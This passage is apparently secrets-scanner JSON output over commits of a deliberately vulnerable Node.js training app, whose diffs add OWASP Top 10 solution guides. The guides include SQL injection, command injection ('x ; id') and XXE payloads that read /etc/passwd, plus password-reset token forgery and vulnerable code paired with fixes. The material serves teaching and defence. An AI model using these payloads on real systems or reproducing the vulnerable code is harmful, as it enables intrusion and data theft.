bypass authentication\n+\n+**Solution**\n+\n+Always use unique, long, secure random generated for secrets\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *config/server.js*\n+\n+**Recommendation**\n+\n+- Do not copy paste code without understanding what it does\n+- Rotate session secrets\n+- Store secrets in environment variables or config files\n+- Consider using a secret management solution if your scale demands it\n+\n+**References**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication>\n+- <https://www.owasp.org/index.php/Broken_Authentication_and_Session_Management>\n+- <https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "ee11cbb19052e40b07aac0ca060c23ee"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,107 @@\n+# Injection\n+\n+## SQL Injection\n+\n+There is a SQL Injection in `User Search` feature at the following URL  \n+\n+http://127.0.0.1:9090/app/usersearch\n+\n+By injecting a single quote `'`, we see an error has occurred.\n+![sqli1](/resources/sqli1.png \"SQLi Trigger\")\n+\n+An attacker can exploit this further and obtain potentially sensitive information from the database by supplying the input `' UNION SELECT password,1 from Users where login='user' -- //`\n+![sqli2](/resources/sqli2.png \"Exploiting SQLi\")\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```         \n+...\n+var query = \"SELECT name FROM Users WHERE login='\" + req.body.login + \"'\";\n+db.sequelize.query(query,{ model: db.User }).then(user => {\n+    if(user.length){\n+...\n+```\n+**Solution**\n+\n+You may use model's **find** function and rely on in-built input sanitization of sequelize\n+\n+*core/appHandler.js*\n+```\n+...\n+if (vh.vCode(req.body.login)){\n+    db.User.find({where:{'login':req.body.login}}).then(user => {\n+        if (user) {\n+...\n+```\n+\n+But it is recommended to explicitly validate/sanitize inputs\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/dc1f9c54685eb04f55e444370d6d622834e4cc00)\n+\n+**Recommendation**\n+\n+- Validate Input before processing\n+- Sanitize Input before storing\n+\n+## Command Injection\n+\n+There is a Command Injection in `Connectivity Test` feature at the following URL\n+\n+http://127.0.0.1:9090/app/ping\n+\n+\n+By injecting `x ; id`, we are able to see that the `id` command has been executed.\n+![ci1](/resources/ci1.png \"Command injection\")\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```\n+const exec = require('child_process').exec;\n+...\n+exec('ping -c 2 '+ req.body.address, function(err,stdout,stderr){\n+    console.log(err)\n+    output = stdout + stderr\n+...\n+```\n+**Solution**\n+\n+You may use `exec_file` or `spawn` method under child_process which will prevent arbitrary command execution.\n+\n+*core/appHandler.js*\n+```\n+const execFile = require('child_process').execFile;\n+...\n+if (vh.vIP(req.body.address)){\n+    execFile('ping', ['-c', '2', req.body.address] , function(err,stdout,stderr){\n+    output = stdout + stderr\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/4fe36fcfbd615fc9ea340e1238be33dd0d140ef8)\n+\n+**Recommendation**\n+\n+- Use exec_file or spawn method instead\n+- Always Validate/Sanitize Input before processing. Look at [validator](https://www.npmjs.com/package/validator)\n+- Run commands in a sandbox/ isolated environment if possible\n+- Use a restricted user for running the process\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A1-Injection>\n+- <https://snyk.io/blog/sql-injection-orm-vulnerabilities/>\n+- <https://hackernoon.com/nodejs-security-issue-javascript-node-example-tutorial-vulnerabilities-hack-line-url-command-injection-412011924d1b>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a1-injection.md", 
    "printDiff": "@@ -0,0 +1,107 @@\n+# Injection\n+\n+## SQL Injection\n+\n+There is a SQL Injection in `User Search` feature at the following URL  \n+\n+http://127.0.0.1:9090/app/usersearch\n+\n+By injecting a single quote `'`, we see an error has occurred.\n+![sqli1](/resources/sqli1.png \"SQLi Trigger\")\n+\n+An attacker can exploit this further and obtain potentially sensitive information from the database by supplying the input `' UNION SELECT password,1 from Users where login='user' -- //`\n+![sqli2](/resources/sqli2.png \"Exploiting SQLi\")\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```         \n+...\n+var query = \"SELECT name FROM Users WHERE login='\" + req.body.login + \"'\";\n+db.sequelize.query(query,{ model: db.User }).then(user => {\n+    if(user.length){\n+...\n+```\n+**Solution**\n+\n+You may use model's **find** function and rely on in-built input sanitization of sequelize\n+\n+*core/appHandler.js*\n+```\n+...\n+if (vh.vCode(req.body.login)){\n+    db.User.find({where:{'login':req.body.login}}).then(user => {\n+        if (user) {\n+...\n+```\n+\n+But it is recommended to explicitly validate/sanitize inputs\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93mdc1f9c54685eb04f55e444370d6d622834e4cc00\u001b[0m)\n+\n+**Recommendation**\n+\n+- Validate Input before processing\n+- Sanitize Input before storing\n+\n+## Command Injection\n+\n+There is a Command Injection in `Connectivity Test` feature at the following URL\n+\n+http://127.0.0.1:9090/app/ping\n+\n+\n+By injecting `x ; id`, we are able to see that the `id` command has been executed.\n+![ci1](/resources/ci1.png \"Command injection\")\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```\n+const exec = require('child_process').exec;\n+...\n+exec('ping -c 2 '+ req.body.address, function(err,stdout,stderr){\n+    console.log(err)\n+    output = stdout + stderr\n+...\n+```\n+**Solution**\n+\n+You may use `exec_file` or `spawn` method under child_process which will prevent arbitrary command execution.\n+\n+*core/appHandler.js*\n+```\n+const execFile = require('child_process').execFile;\n+...\n+if (vh.vIP(req.body.address)){\n+    execFile('ping', ['-c', '2', req.body.address] , function(err,stdout,stderr){\n+    output = stdout + stderr\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m4fe36fcfbd615fc9ea340e1238be33dd0d140ef8\u001b[0m)\n+\n+**Recommendation**\n+\n+- Use exec_file or spawn method instead\n+- Always Validate/Sanitize Input before processing. Look at [validator](https://www.npmjs.com/package/validator)\n+- Run commands in a sandbox/ isolated environment if possible\n+- Use a restricted user for running the process\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A1-Injection>\n+- <https://snyk.io/blog/sql-injection-orm-vulnerabilities/>\n+- <https://hackernoon.com/nodejs-security-issue-javascript-node-example-tutorial-vulnerabilities-hack-line-url-command-injection-412011924d1b>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "dc1f9c54685eb04f55e444370d6d622834e4cc00", 
        "4fe36fcfbd615fc9ea340e1238be33dd0d140ef8"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,62 @@\n+# Insufficient Logging and Monitoring\n+\n+Exploitation of insufficient logging and monitoring is the bedrock of nearly every major incident.\n+\n+- Auditable events, such as logins, failed logins, and high-value transactions are not logged.\n+- Warnings and errors generate no, inadequate, or unclear log messages.\n+- Logs of applications and APIs are not monitored for suspicious activity.\n+- Logs are only stored locally.\n+- Appropriate alerting thresholds and response escalation processes are not in place or effective.\n+- Penetration testing and scans by DAST tools (such as OWASP ZAP) do not trigger alerts.\n+- The application is unable to detect, escalate, or alert for active attacks in real time or near real time.\n+\n+**Solution**\n+\n+All critical functionalities of the application must be logged. We use winston, a logging library to handle our logging.\n+\n+Define a default logger\n+\n+*server.js*\n+```js\n+var winston = require('winston')\n+...\n+winston.configure({\n+  format: winston.format.json(),\n+  transports: [\n+    new winston.transports.File({ filename: 'combined.log' })\n+  ]\n+});\n+...\n+```\n+\n+Log from anywhere\n+\n+*core/passport.js*\n+```js\n+var winston = requir('winston')\n+...\n+if (!isValidPassword(user, password)) {\n+    winston.log({level:'warn',message:'Failed login attempt for ', username})\n+    return done(null, false, req.flash('danger', 'Invalid Credentials'))\n+}\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *core/passport.js*\n+- *core/authHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/56c5e82c1a000e26ae19afb67b6696d634ceab2e)\n+\n+**Recommendation**\n+\n+- Log all sensitive operations by default\n+- Ensure that the logs are stored and processed securely\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A10-Insufficient_Logging%26Monitoring>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a10-insufficient-logging.md", 
    "printDiff": "@@ -0,0 +1,62 @@\n+# Insufficient Logging and Monitoring\n+\n+Exploitation of insufficient logging and monitoring is the bedrock of nearly every major incident.\n+\n+- Auditable events, such as logins, failed logins, and high-value transactions are not logged.\n+- Warnings and errors generate no, inadequate, or unclear log messages.\n+- Logs of applications and APIs are not monitored for suspicious activity.\n+- Logs are only stored locally.\n+- Appropriate alerting thresholds and response escalation processes are not in place or effective.\n+- Penetration testing and scans by DAST tools (such as OWASP ZAP) do not trigger alerts.\n+- The application is unable to detect, escalate, or alert for active attacks in real time or near real time.\n+\n+**Solution**\n+\n+All critical functionalities of the application must be logged. We use winston, a logging library to handle our logging.\n+\n+Define a default logger\n+\n+*server.js*\n+```js\n+var winston = require('winston')\n+...\n+winston.configure({\n+  format: winston.format.json(),\n+  transports: [\n+    new winston.transports.File({ filename: 'combined.log' })\n+  ]\n+});\n+...\n+```\n+\n+Log from anywhere\n+\n+*core/passport.js*\n+```js\n+var winston = requir('winston')\n+...\n+if (!isValidPassword(user, password)) {\n+    winston.log({level:'warn',message:'Failed login attempt for ', username})\n+    return done(null, false, req.flash('danger', 'Invalid Credentials'))\n+}\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *core/passport.js*\n+- *core/authHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m56c5e82c1a000e26ae19afb67b6696d634ceab2e\u001b[0m)\n+\n+**Recommendation**\n+\n+- Log all sensitive operations by default\n+- Ensure that the logs are stored and processed securely\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A10-Insufficient_Logging%26Monitoring>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "56c5e82c1a000e26ae19afb67b6696d634ceab2e"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,83 @@\n+# Broken Authentication\n+\n+## Insecure Reset Password\n+\n+The `Reset password` functionality can be triggered by visiting an URL such as below\n+\n+http://127.0.0.1:9090/resetpw?login=user&token=ee11cbb19052e40b07aac0ca060c23ee\n+\n+The trust establishment in reset password is inherently weak because the _login_ name and _token_ parameter required to execute the password reset is user supplied. Additionally the apparently random key is the MD5 hash of _login_ name which can be easily computed by an attacker.\n+\n+This issue can be exploited by an attacker to reset any user's password by using an URL such as below\n+\n+```\n+http://127.0.0.1:9090/resetpw?login=<username>&token=<md5(username)>\n+```\n+\n+You can obtain the md5sum for `user` by running the following \n+\n+```bash\n+echo -n 'user' | md5sum\n+```\n+\n+**Solution**\n+\n+Store the password reset request along with a randomly generated token string and expiry\n+\n+Email a reset link containing that token and username to the user\n+\n+Validate the reset token for the user before password reset\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/authHandler.js*\n+- *models/passreset.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/c8d519e41a752def46d80de699a94a23800df426)\n+\n+## Insecure Session Secret\n+\n+The session secret is used is insecure and is used in the example snippets across the web\n+\n+**Vulnerable Code snippet**\n+\n+*server.js*\n+```\n+...\n+app.use(session({\n+  secret: 'keyboard cat',\n+  resave: false,\n+...\n+```\n+\n+This allows an attacker to\n+1. Decrypt a user's session\n+2. Potentially forge the session cookie and bypass authentication\n+\n+**Solution**\n+\n+Always use unique, long, secure random generated for secrets\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *config/server.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/1d01e9af620d88a938a2abdf97306fa20026b927)\n+\n+**Recommendation**\n+\n+- Do not copy paste code without understanding what it does\n+- Rotate session secrets\n+- Store secrets in environment variables or config files\n+- Consider using a secret management solution if your scale demands it\n+\n+**References**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication>\n+- <https://www.owasp.org/index.php/Broken_Authentication_and_Session_Management>\n+- <https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a2-broken-auth.md", 
    "printDiff": "@@ -0,0 +1,83 @@\n+# Broken Authentication\n+\n+## Insecure Reset Password\n+\n+The `Reset password` functionality can be triggered by visiting an URL such as below\n+\n+http://127.0.0.1:9090/resetpw?login=user&token=\u001b[93mee11cbb19052e40b07aac0ca060c23ee\u001b[0m\n+\n+The trust establishment in reset password is inherently weak because the _login_ name and _token_ parameter required to execute the password reset is user supplied. Additionally the apparently random key is the MD5 hash of _login_ name which can be easily computed by an attacker.\n+\n+This issue can be exploited by an attacker to reset any user's password by using an URL such as below\n+\n+```\n+http://127.0.0.1:9090/resetpw?login=<username>&token=<md5(username)>\n+```\n+\n+You can obtain the md5sum for `user` by running the following \n+\n+```bash\n+echo -n 'user' | md5sum\n+```\n+\n+**Solution**\n+\n+Store the password reset request along with a randomly generated token string and expiry\n+\n+Email a reset link containing that token and username to the user\n+\n+Validate the reset token for the user before password reset\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/authHandler.js*\n+- *models/passreset.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93mc8d519e41a752def46d80de699a94a23800df426\u001b[0m)\n+\n+## Insecure Session Secret\n+\n+The session secret is used is insecure and is used in the example snippets across the web\n+\n+**Vulnerable Code snippet**\n+\n+*server.js*\n+```\n+...\n+app.use(session({\n+  secret: 'keyboard cat',\n+  resave: false,\n+...\n+```\n+\n+This allows an attacker to\n+1. Decrypt a user's session\n+2. Potentially forge the session cookie and bypass authentication\n+\n+**Solution**\n+\n+Always use unique, long, secure random generated for secrets\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *config/server.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m1d01e9af620d88a938a2abdf97306fa20026b927\u001b[0m)\n+\n+**Recommendation**\n+\n+- Do not copy paste code without understanding what it does\n+- Rotate session secrets\n+- Store secrets in environment variables or config files\n+- Consider using a secret management solution if your scale demands it\n+\n+**References**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication>\n+- <https://www.owasp.org/index.php/Broken_Authentication_and_Session_Management>\n+- <https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "ee11cbb19052e40b07aac0ca060c23ee", 
        "c8d519e41a752def46d80de699a94a23800df426", 
        "1d01e9af620d88a938a2abdf97306fa20026b927"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,78 @@\n+# Sensitive Data Exposure\n+\n+## Hashed Passwords Disclosed\n+\n+![info-dis](/resources/info-dis.png \"Password Hash Disclosed\")\n+\n+The Admin API endpoint at http://127.0.0.1:9090/app/admin/api/users sends the entire user object to the front end. Even if the application/page rendering this may not display the password, it's critical that only necessary information is sent instead of the entire object\n+\n+**Vulnerable Code snippet**\n+\n+*core/apphandler.js*\n+```\n+...\n+db.User.findAll({}).then(users => {\n+    res.status(200).json({\n+        success: true,\n+        users: users\n+    })\n+...\n+```\n+\n+\n+**Solution**\n+\n+This particular error can be fixed by selecting for only the required attributes from the database\n+\n+```\n+db.User.findAll({attributes: [ 'id' ,'name', 'email']},).then(users => {\n+    res.status(200).json({\n+        success: true,\n+        users: users\n+    })\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/7c28c2e007ac48badc604e52621c37bbb8da8fbd)\n+\n+## Logging of sensitive information\n+\n+![info-dis](/resources/info-dis2.png \"Password Hash Disclosed\")\n+\n+By default, Sequelize logs every query using `console.log`, this could be a serious issue if these logs are stored to disk or worse, sent elsewhere for analytics or other purposes\n+\n+**Solution**\n+\n+To fix this issue, disable logging in Sequelize\n+\n+```\n+// Sequelize connection\n+var sequelize = new Sequelize(config.database, config.username, config.password, {\n+    host: config.host, \n+    dialect: config.dialect, \n+    logging: false\n+});\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *models/index.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/60ed581799f2257e1be2d8a7747014d6b3d123af)\n+\n+**Recommendation**\n+\n+- Always be wary of where all your data resides or is transmitted to\n+- Send only the minimum information which is essential, even if may not be used\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure>\n+- <https://stackoverflow.com/questions/28927836/prevent-sequelize-from-outputting-sql-to-the-console-on-execution-of-query>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a3-sensitive-data-exposure.md", 
    "printDiff": "@@ -0,0 +1,78 @@\n+# Sensitive Data Exposure\n+\n+## Hashed Passwords Disclosed\n+\n+![info-dis](/resources/info-dis.png \"Password Hash Disclosed\")\n+\n+The Admin API endpoint at http://127.0.0.1:9090/app/admin/api/users sends the entire user object to the front end. Even if the application/page rendering this may not display the password, it's critical that only necessary information is sent instead of the entire object\n+\n+**Vulnerable Code snippet**\n+\n+*core/apphandler.js*\n+```\n+...\n+db.User.findAll({}).then(users => {\n+    res.status(200).json({\n+        success: true,\n+        users: users\n+    })\n+...\n+```\n+\n+\n+**Solution**\n+\n+This particular error can be fixed by selecting for only the required attributes from the database\n+\n+```\n+db.User.findAll({attributes: [ 'id' ,'name', 'email']},).then(users => {\n+    res.status(200).json({\n+        success: true,\n+        users: users\n+    })\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m7c28c2e007ac48badc604e52621c37bbb8da8fbd\u001b[0m)\n+\n+## Logging of sensitive information\n+\n+![info-dis](/resources/info-dis2.png \"Password Hash Disclosed\")\n+\n+By default, Sequelize logs every query using `console.log`, this could be a serious issue if these logs are stored to disk or worse, sent elsewhere for analytics or other purposes\n+\n+**Solution**\n+\n+To fix this issue, disable logging in Sequelize\n+\n+```\n+// Sequelize connection\n+var sequelize = new Sequelize(config.database, config.username, config.password, {\n+    host: config.host, \n+    dialect: config.dialect, \n+    logging: false\n+});\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *models/index.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m60ed581799f2257e1be2d8a7747014d6b3d123af\u001b[0m)\n+\n+**Recommendation**\n+\n+- Always be wary of where all your data resides or is transmitted to\n+- Send only the minimum information which is essential, even if may not be used\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure>\n+- <https://stackoverflow.com/questions/28927836/prevent-sequelize-from-outputting-sql-to-the-console-on-execution-of-query>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "7c28c2e007ac48badc604e52621c37bbb8da8fbd", 
        "60ed581799f2257e1be2d8a7747014d6b3d123af"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,65 @@\n+# XML External Entities\n+\n+The `Bulk Import` feature at http://127.0.0.1:9090/app/bulkproducts is vulnerable to XML External Entity attack.\n+\n+![xxe1](/resources/xxe1.png)\n+\n+This can be easily exploited by supplying an input like the one below\n+\n+```xml\n+<!DOCTYPE foo [<!ELEMENT foo ANY >\n+<!ENTITY bar SYSTEM \"file:///etc/passwd\" >]>\n+<products>\n+   <product>\n+      <name>Playstation 4</name>\n+      <code>274</code>\n+      <tags>gaming console</tags>\n+      <description>&bar;</description>\n+   </product>\n+</products>\n+```\n+\n+The resulting product's description will have the contents of `/etc/passwd`\n+\n+![xxe2](/resources/xxe2.png)\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```\n+...\n+module.exports.bulkProducts =  function(req, res) {\n+\tif (req.files.products && req.files.products.mimetype=='text/xml'){\n+\t\tvar products = libxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:true,noblanks:true})\n+...\n+```\n+\n+**Solution**\n+\n+The XML parsing library used is `libxmljs` which allows for parsing external entities. We can disable parsing of external entities by modifying the flag value `noent` to `false`.\n+\n+*core/appHandler.js*\n+```\n+...\n+module.exports.bulkProducts =  function(req, res) {\n+\tif (req.files.products && req.files.products.mimetype=='text/xml'){\n+\t\tvar products = libxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:false,noblanks:true})\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following file\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/15f9dc298ff8e46f0dbeca6b260416c086db2446)\n+\n+**Recommendation**\n+\n+- Ensure that External entity parsing is disabled\n+- If parsing is absoutely required, then validate the data before parsing\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a4-xxe.md", 
    "printDiff": "@@ -0,0 +1,65 @@\n+# XML External Entities\n+\n+The `Bulk Import` feature at http://127.0.0.1:9090/app/bulkproducts is vulnerable to XML External Entity attack.\n+\n+![xxe1](/resources/xxe1.png)\n+\n+This can be easily exploited by supplying an input like the one below\n+\n+```xml\n+<!DOCTYPE foo [<!ELEMENT foo ANY >\n+<!ENTITY bar SYSTEM \"file:///etc/passwd\" >]>\n+<products>\n+   <product>\n+      <name>Playstation 4</name>\n+      <code>274</code>\n+      <tags>gaming console</tags>\n+      <description>&bar;</description>\n+   </product>\n+</products>\n+```\n+\n+The resulting product's description will have the contents of `/etc/passwd`\n+\n+![xxe2](/resources/xxe2.png)\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```\n+...\n+module.exports.bulkProducts =  function(req, res) {\n+\tif (req.files.products && req.files.products.mimetype=='text/xml'){\n+\t\tvar products = libxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:true,noblanks:true})\n+...\n+```\n+\n+**Solution**\n+\n+The XML parsing library used is `libxmljs` which allows for parsing external entities. We can disable parsing of external entities by modifying the flag value `noent` to `false`.\n+\n+*core/appHandler.js*\n+```\n+...\n+module.exports.bulkProducts =  function(req, res) {\n+\tif (req.files.products && req.files.products.mimetype=='text/xml'){\n+\t\tvar products = libxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:false,noblanks:true})\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following file\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m15f9dc298ff8e46f0dbeca6b260416c086db2446\u001b[0m)\n+\n+**Recommendation**\n+\n+- Ensure that External entity parsing is disabled\n+- If parsing is absoutely required, then validate the data before parsing\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "15f9dc298ff8e46f0dbeca6b260416c086db2446"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,115 @@\n+# Broken Access Control\n+\n+## Unauthorized Access to Users API\n+\n+The issue lies in `List Users` API implementation where the code does not correctly establish identity and capability for the calling user before fulfilling the request.\n+\n+**Vulnerable Code snippet**\n+\n+*routes/app.js*\n+```\n+...\n+router.get('/admin',authHandler.isAuthenticated,function(req,res){\n+    res.render('app/admin',{admin: (req.user.role=='admin')})\n+})\n+\n+router.get('/admin/api/users',authHandler.isAuthenticated, appHandler.listUsersAPI)\n+...\n+```\n+\n+*views/app/admin.ejs*\n+```\n+...\n+var isAdmin = false;\n+if(!isAdmin){\n+    var div = document.getElementById('admin-body');\n+    div.style.display = \"none\";\n+}else{\n+    var div = document.getElementById('non-admin-body');\n+    div.style.display = \"none\";            \n+}\n+...\n+```\n+\n+By checking the page source, we are able to see the `List Users API` that isn't visible in the Dashboard.\n+\n+![missing-fn-access](/resources/missing-fn-access.png \"API Hidden in Front End\")\n+\n+The API endpoint doesn't check whether the requesting user is an admin. Assuming that an attacker will not be able to access your endpoints because they are hidden is a very bad practice.\n+\n+**Solution**\n+\n+The `List Users API` route must check the requesting user's privilege before serving the request.\n+\n+```\n+function adminCheck(req,res,next){\n+    if(req.user.role=='admin')\n+        next()\n+    else\n+        res.status(401).send('Unauthorized')\n+}\n+\n+router.get('/admin/api/users',authHandler.isAuthenticated, adminCheck, appHandler.listUsersAPI)\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/authHandler.js*\n+- *routes/app.js*\n+- *views/app/admin.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/1d10d266567a6b721bd368500838756e1cd7966b)\n+\n+## Missing Authorization check in Edit User\n+\n+The `userEditSubmit` method fails to validate `id` parameter to ensure that the calling user has appropriate access to the object. This issue can be exploited to reset information for any user identified by id.\n+\n+http://127.0.0.1:9090/app/useredit\n+\n+**Vulnerable Code snippet**\n+\n+*core/apphandler.js*\n+```\n+...\n+module.exports.userEditSubmit = function(req,res){\n+    if(req.body.password==req.body.cpassword){\n+        db.User.find({where:{'id':req.body.id}}).then(user=>{\n+            if(user){\n+                user.password = bCrypt.hashSync(req.body.password, bCrypt.genSaltSync(10), null)\n+                user.save().then(function(){\n+...\n+```\n+\n+Simply changing the user id in the page can lead to exploitation.<br><br>\n+![idor1](/resources/idor1.png \"IDOR\")\n+\n+**Solution**\n+\n+A simple check can solve this issue\n+```\n+if (req.user.id == req.body.id)\n+ //do\n+else\n+ //dont\n+```\n+\n+In our case we can use passports user object at `req.user` for modifying user information\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/edfe31c81e8594ac336b3fd3a558e174af9fe7b3)\n+\n+**Recommendation**\n+\n+- Try to restrict your functions to maximum extent, White listing is always better than blacklisting\n+- Consider any user supplied information as untrusted and always validate user access by sessions\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control>\n", 
    "path": "docs/solution/a5-broken-access-control.md", 
    "printDiff": "@@ -0,0 +1,115 @@\n+# Broken Access Control\n+\n+## Unauthorized Access to Users API\n+\n+The issue lies in `List Users` API implementation where the code does not correctly establish identity and capability for the calling user before fulfilling the request.\n+\n+**Vulnerable Code snippet**\n+\n+*routes/app.js*\n+```\n+...\n+router.get('/admin',authHandler.isAuthenticated,function(req,res){\n+    res.render('app/admin',{admin: (req.user.role=='admin')})\n+})\n+\n+router.get('/admin/api/users',authHandler.isAuthenticated, appHandler.listUsersAPI)\n+...\n+```\n+\n+*views/app/admin.ejs*\n+```\n+...\n+var isAdmin = false;\n+if(!isAdmin){\n+    var div = document.getElementById('admin-body');\n+    div.style.display = \"none\";\n+}else{\n+    var div = document.getElementById('non-admin-body');\n+    div.style.display = \"none\";            \n+}\n+...\n+```\n+\n+By checking the page source, we are able to see the `List Users API` that isn't visible in the Dashboard.\n+\n+![missing-fn-access](/resources/missing-fn-access.png \"API Hidden in Front End\")\n+\n+The API endpoint doesn't check whether the requesting user is an admin. Assuming that an attacker will not be able to access your endpoints because they are hidden is a very bad practice.\n+\n+**Solution**\n+\n+The `List Users API` route must check the requesting user's privilege before serving the request.\n+\n+```\n+function adminCheck(req,res,next){\n+    if(req.user.role=='admin')\n+        next()\n+    else\n+        res.status(401).send('Unauthorized')\n+}\n+\n+router.get('/admin/api/users',authHandler.isAuthenticated, adminCheck, appHandler.listUsersAPI)\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/authHandler.js*\n+- *routes/app.js*\n+- *views/app/admin.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m1d10d266567a6b721bd368500838756e1cd7966b\u001b[0m)\n+\n+## Missing Authorization check in Edit User\n+\n+The `userEditSubmit` method fails to validate `id` parameter to ensure that the calling user has appropriate access to the object. This issue can be exploited to reset 